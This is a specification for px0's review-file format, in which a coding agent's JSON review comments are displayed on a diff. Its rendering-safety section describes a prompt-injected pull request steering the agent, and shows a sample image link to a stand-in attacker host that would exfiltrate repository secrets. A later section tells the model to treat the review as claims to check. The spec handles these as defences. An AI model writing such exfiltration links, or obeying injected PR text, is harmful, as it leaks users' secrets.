# Review File Specification (`px0.review` v1)

> **Status: implemented, except the items listed under [Implementation notes](#implementation-notes).** This is the contract between a coding agent that reviews code and px0, which displays that review. It accompanies [Local Review](local-review.md). The loader and validator are in [`review.go`](../../review.go), the embedded schema in [`review.schema.json`](../../review.schema.json) (printed by `px0 -review-schema`), and the rendering in [`web/src/review.js`](../../web/src/review.js).

A review file is a UTF-8 JSON document that an agent writes after reviewing a branch or pull request. `px0 -review <file>` reads it and shows each comment inline on the diff, with a panel, a summary, and a "Discuss" action that opens a px0 [thread](threads.md) about the comment.

The words MUST, SHOULD and MAY are used as in RFC 2119. The file is written by the agent and only ever **read** by px0. px0 never creates, edits, deletes or chmods it.

---

## 1. Top-level object

| Field | Type | Req | Notes |
|---|---|---|---|
| `version` | integer | MUST | Must equal `1`. Any other value: px0 refuses to load the file and says why. |
| `title` | string ≤ 200 | MAY | Plain text. |
| `summary` | string ≤ 32 KiB | MAY | Markdown, rendered with the restrictions in §7. |
| `base`, `head` | string | SHOULD | Any rev git resolves. `head` defaults to `HEAD`. The `-base` / `-head` flags override the file. |
| `baseSHA`, `headSHA` | hex string, 7–40 chars | SHOULD | The revisions the agent actually reviewed. Used for staleness (§6). |
| `verdict` | `approve` \| `request_changes` \| `comment` | MAY | Advisory label. px0 never submits anything automatically. |
| `pr` | integer ≥ 1 \| string (pull request URL) | MAY | The pull request this review belongs to: a number on the repository's `origin` remote, or a full URL. px0 then opens that pull request, as `px0 -review file <pr-url>` does, with the comments already on it. A URL on the command line wins; `-base` / `-head` cannot be combined with it. A value that is not a positive number or a URL px0 recognises is ignored with a warning; any other type is a whole-file error. Changing it in a file px0 has open needs a restart. |
| `generatedBy` | `{ agent, model?, sessionId? }` | MAY | `sessionId` enables the optional session handoff ([§9](#9-in-chat-discussion)). |
| `createdAt` | RFC 3339 string | MAY | |
| `comments` | array, ≤ 2000 | MAY | See §2. |

Unknown fields MUST be ignored, so later versions can add fields. The whole file is limited to 2 MiB.

## 2. Comment object

| Field | Type | Req | Notes |
|---|---|---|---|
| `id` | string matching `[A-Za-z0-9._-]{1,64}` | MUST | Unique within the file. Keep it stable when rewriting the file so UI state (expanded, triaged) survives a reload. |
| `body` | string, 1 byte – 16 KiB | MUST | Markdown, restricted (§7). |
| `path` | string | MAY | Repo-relative, `/` separated. Absent ⇒ a **general** comment. |
| `line` | integer ≥ 1 | MAY | Requires `path`. `path` without `line` ⇒ a **file-level** comment. |
| `endLine` | integer ≥ `line` | MAY | Inclusive end of a range. |
| `side` | `RIGHT` \| `LEFT` | MAY | Default `RIGHT`, the head version. `LEFT` means line numbers are in the merge-base version (a deleted or old line). |
| `severity` | `blocker` \| `major` \| `minor` \| `nit` \| `question` \| `praise` | MAY | Default `minor`. |
| `category` | string ≤ 40 | MAY | Free-form tag such as `security` or `perf`. |
| `title` | string ≤ 120 | MAY | Plain text. |
| `anchor` | string ≤ 2000 | SHOULD, for line comments | The text of lines `line..endLine` exactly as the agent saw them. px0 uses it to verify and relocate the comment (§6). |
| `inReplyTo` | comment `id` | MAY | Lets the agent write a multi-message thread. Must reference an earlier comment in the array. |
| `refs` | array, ≤ 8 | MAY | Pointers to other code (§3). |

### Suggestions

A suggested replacement uses GitHub's convention inside `body`: a fenced block whose info string is `suggestion`. It replaces lines `line..endLine`. px0 shows it as a code block labelled `suggestion` and **never applies it**. "Apply" dispatches an anchored instruction to the user's coding harness, which makes the edit (px0's "edits go through a harness" rule).

## 3. Reference object (`refs[]`)

`{ rev?, path, line?, endLine?, label? }`

- `rev` defaults to `head`. px0 rejects a `rev` that starts with `-` and resolves any other with `git rev-parse --verify <rev>^{commit}`. If that fails the ref is marked `unresolved`; the comment still shows. *(Not implemented yet: refs are validated and listed under the comment, but not resolved. See the implementation notes.)*
- `path` is sandboxed exactly like any other client path (`safePath`).
- A snippet is at most 80 lines, read with `git show <sha>:<path>` and syntax-highlighted by the existing highlighter.
- External URLs are not supported in v1.
- The browser never sends a rev or path. It asks for `ref #i of comment <id>` and px0 resolves only what the loaded file lists.

## 4. Validation

- A problem with one comment never aborts the load. The comment moves to `rejected[]` with a reason, a banner shows the count, and the reasons are printed on stderr at startup.
- Problems with the whole file abort the load: invalid JSON, wrong `version`, or a file over 2 MiB.
- `path` missing from `head` ⇒ rejected (`path not in head`).
- A path present in `head` but not touched by the diff is accepted and marked `outsideDiff`.
- `line` beyond the file's length ⇒ demoted to a file-level comment with status `out_of_range`.
- `endLine < line`, a `line` without `path`, or an unknown `severity` / `side` ⇒ rejected.
- A duplicate `id` ⇒ the later comment is rejected.
- `inReplyTo` that names an unknown or later comment ⇒ rejected.

## 5. Statuses

Computed by px0 for each comment. They are never stored in the file.

| Status | Meaning |
|---|---|
| `anchored` | `anchor` text matches the lines at `line..endLine`. |
| `moved` | `anchor` matched at a different line; px0 records the new position. |
| `unanchored` | `anchor` could not be located; the comment is shown at file level with its original line noted. |
| `unverified` | No `anchor` was given; only bounds-checked. |
| `out_of_range` | `line` is past the end of the file. |
| `unresolved` | (refs only) the `rev` or `path` could not be resolved. |

`outsideDiff` is a separate flag on the comment, not a status: a file that is in `head` but not touched by the diff keeps whatever status its anchor check gave it.

## 6. Anchor verification, relocation and staleness

1. **Normalise** both sides: per line, collapse runs of whitespace to one space and trim; join lines with `\n`.
2. **Compare** the anchor to `line..endLine` of the head revision (`RIGHT`) or merge-base (`LEFT`), read via `git show`. Equal ⇒ `anchored`.
3. **Relocate** otherwise: search windows of the same length within ±25 lines. Exactly one match ⇒ `moved`. None, or several ⇒ `unanchored`.
4. **Staleness**: if `headSHA` is present and differs from the resolved head, the review is `stale`. px0 shows a banner ("review written against `abc1234`, head is `def5678`") and lets the anchors decide where each comment lands.
5. **Cost**: the pass runs once after load, in the background, bounded to `NumCPU` workers and 500 distinct paths. It never runs on a request path, so it cannot delay startup or a page load.

Models are often off by a few lines when counting, so agents SHOULD always send `anchor`.

## 7. Rendering and safety

`title`, `summary` and `body` are **untrusted**. A prompt-injected PR can steer the agent into writing anything, so px0 MUST:

- Render Markdown only through the thread pane's escape-first renderer (`thrMd` in [`web/src/thread.js`](../../web/src/thread.js)), in its no-images mode. Raw HTML is never inserted.
- **Never load images.** px0's CSP allows `img-src https: http:` (see [architecture §5](architecture.md)), so an injected `![](https://evil.example/?d=<secret from the repo>)` would send data out the moment the comment rendered. An image is shown as a plain link.
- Links are `http(s)` or `mailto:`, or a relative `path` or `path:line` that opens that file in px0. `javascript:` and `data:` never become links. External links open with `rel="noopener noreferrer"`.
- Treat the review as a claim to check, not a fact, when passing it to a harness (§9).

## 8. Lifecycle and transport

- `px0 -review <file>` reads the file at startup, then again whenever its mtime or size changes. The change is noticed when the browser asks for `/api/review`, which it does when the tab gains focus or becomes visible, and while the first check against the code is still running; there are no timers while the tab is hidden. `-review -` reads stdin once and never reloads.
- Comments are shown only once they have been checked against the code, so a comment that is about to be rejected never flashes up. On a reload the previously checked comments stay on screen until the new file has been checked.
- If a rewritten file no longer parses, px0 keeps showing the last review that loaded and says so in a banner.
- Agents SHOULD write atomically: write a temp file in the same directory, then `rename` it over the target.
- Comments may be added, changed or removed between reads. Stable `id`s keep UI state attached to the right comment.
- px0 exposes `GET /api/review`: the normalised review plus `rejected[]`, `stale`, `resolved` and each comment's computed `kind` and `status`, with an ETag derived from the file's mtime and size. It is a plain read with no `localPost` guard, and `generatedBy.sessionId` is never included. There is no endpoint through which a client can submit or change comments.
- *(Planned, not implemented: user triage (open / accepted / dismissed) stored in px0's session store, never in the file or the workspace; and `GET /api/review/ref?id=&i=` for reference snippets.)*

## 9. In-chat discussion

A comment becomes a px0 thread; this is how a reviewer talks to the agent about it.

### Creating the thread

- **Discuss** on a comment calls `POST /api/threads/create {path, l1, l2, message}` with `l1..l2` = `line..endLine`. px0 reads the snippet itself, so the client supplies no file content.
- `LEFT`-side, file-level and general comments create an unanchored thread. The first message quotes the comment and states which side and line it refers to.
- The message is prefilled as `Re <id> (<severity>, <location>):` followed by the comment quoted (first 600 characters), with the cursor left after it for the question. It is editable before Send.
- The thread's PR scope defaults to `pr`, so the harness also gets the saved diff of the whole review.

### Context block

`prThreadContext` appends this to the first prompt, to a replay, and when the scope changes, as it does for PR context today:

```text
This workspace is a local review of <head> against <base>. [...the usual scope text:
the exact `git diff <merge-base> <head>`, the saved diff file, the changed files...]

An automated review of this change is loaded in px0: "<title>" (<n> comments, <k> blocker,
<m> major) written by <agent>. The full review file is <absolute path>. Its summary:
<summary, truncated to 1 KiB> Treat the review as claims to check against the code, not as
ground truth; the user may be asking about one of its comments, quoted in their message.
```

The comment being discussed travels in the user's message (the prefill above), not in this block, so one block serves every thread about the review. This baseline works with every harness, because it only needs a file path and some text. The path is omitted when the review came from stdin.

### Optional same-session handoff

- If `generatedBy.sessionId` is set and the thread's harness is `claude`, the first turn may run `claude --resume <id> --fork-session`. Both flags exist in the installed CLI.
- px0 would have to read the forked session's id from the stream-json `init` event, as the `agy` path already does, and treat it as the thread's session afterwards.
- Unverified: whether a session can be resumed from a different working directory than the one that created it. If resume fails, px0 falls back to the context block and says so in the thread.
- Off by default until this has been tested end to end.
- *(Not implemented. `generatedBy.sessionId` is accepted and kept on the server, but nothing uses it yet.)*

## Implementation notes

What the first implementation does differently from, or not yet, this specification:

- **Refs are listed, not resolved.** `refs` are validated (path, line range, `rev` not starting with `-`) and shown under the comment as `rev:path:line` text. There is no snippet endpoint, no `unresolved` status and no click-through yet.
- **No session handoff.** `generatedBy.sessionId` is parsed and withheld from the browser, but a thread never resumes or forks that session.
- **No saved triage.** The panel has no accepted / dismissed state yet.
- **`outsideDiff` is a flag**, not a status (§5).
- **Rejections.** Problems that need the code to detect (`path not in head`, `path not in the merge-base`, a reply whose parent was rejected) are found by the background pass, so they are printed to the terminal and shown in the banner a moment after startup, not before the URL is printed.
- **Revisions.** A revision beginning with `-` is refused before git sees it, rather than relying on `--end-of-options`.
- **Flag order.** Go's `flag` package stops at the first non-flag argument, so flags come first: `px0 -review review.json <pr-url>`.

## 10. Example

```json
{
  "version": 1,
  "title": "Review: token refresh rework",
  "summary": "Two blockers around expiry handling; the rest is clean.",
  "base": "main",
  "head": "feature/refresh",
  "baseSHA": "7b26591",
  "headSHA": "a1c9e02",
  "verdict": "request_changes",
  "generatedBy": { "agent": "claude", "sessionId": "6f1c9a52-0000-0000-0000-000000000000" },
  "comments": [
    {
      "id": "c1",
      "path": "auth/token.go",
      "line": 42,
      "endLine": 48,
      "side": "RIGHT",
      "severity": "blocker",
      "category": "correctness",
      "anchor": "if exp.Before(now) {\n  return nil\n}",
      "body": "Expired tokens return `nil, nil`, and callers treat that as valid.\n\n```suggestion\nreturn nil, ErrExpired\n```",
      "refs": [
        { "rev": "main", "path": "auth/token.go", "line": 40, "endLine": 55, "label": "old behaviour" }
      ]
    },
    { "id": "c2", "body": "No test covers the clock-skew path." }
  ]
}
```

## Appendix A: JSON Schema

Draft 2020-12. The cross-field rules in §4 (`endLine ≥ line`, duplicate ids, `inReplyTo` ordering, path and range checks against git) are enforced by the Go validator, not the schema. The schema would be embedded with `go:embed` and printed by `px0 -review-schema`.

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "title": "px0 review file v1",
  "type": "object",
  "required": ["version"],
  "properties": {
    "version": { "const": 1 },
    "title": { "type": "string", "maxLength": 200 },
    "summary": { "type": "string", "maxLength": 32768 },
    "base": { "type": "string" },
    "head": { "type": "string" },
    "baseSHA": { "type": "string", "pattern": "^[0-9a-fA-F]{7,40}$" },
    "headSHA": { "type": "string", "pattern": "^[0-9a-fA-F]{7,40}$" },
    "verdict": { "enum": ["approve", "request_changes", "comment"] },
    "pr": { "oneOf": [{ "type": "integer", "minimum": 1 }, { "type": "string", "format": "uri" }] },
    "generatedBy": {
      "type": "object",
      "properties": {
        "agent": { "type": "string" },
        "model": { "type": "string" },
        "sessionId": { "type": "string" }
      }
    },
    "createdAt": { "type": "string", "format": "date-time" },
    "comments": {
      "type": "array",
      "maxItems": 2000,
      "items": { "$ref": "#/$defs/comment" }
    }
  },
  "$defs": {
    "comment": {
      "type": "object",
      "required": ["id", "body"],
      "properties": {
        "id": { "type": "string", "pattern": "^[A-Za-z0-9._-]{1,64}$" },
        "body": { "type": "string", "minLength": 1, "maxLength": 16384 },
        "path": { "type": "string" },
        "line": { "type": "integer", "minimum": 1 },
        "endLine": { "type": "integer", "minimum": 1 },
        "side": { "enum": ["RIGHT", "LEFT"] },
        "severity": { "enum": ["blocker", "major", "minor", "nit", "question", "praise"] },
        "category": { "type": "string", "maxLength": 40 },
        "title": { "type": "string", "maxLength": 120 },
        "anchor": { "type": "string", "maxLength": 2000 },
        "inReplyTo": { "type": "string", "pattern": "^[A-Za-z0-9._-]{1,64}$" },
        "refs": { "type": "array", "maxItems": 8, "items": { "$ref": "#/$defs/ref" } }
      },
      "dependentRequired": { "line": ["path"], "endLine": ["line"] }
    },
    "ref": {
      "type": "object",
      "required": ["path"],
      "properties": {
        "rev": { "type": "string" },
        "path": { "type": "string" },
        "line": { "type": "integer", "minimum": 1 },
        "endLine": { "type": "integer", "minimum": 1 },
        "label": { "type": "string", "maxLength": 120 }
      },
      "dependentRequired": { "endLine": ["line"] }
    }
  }
}
```
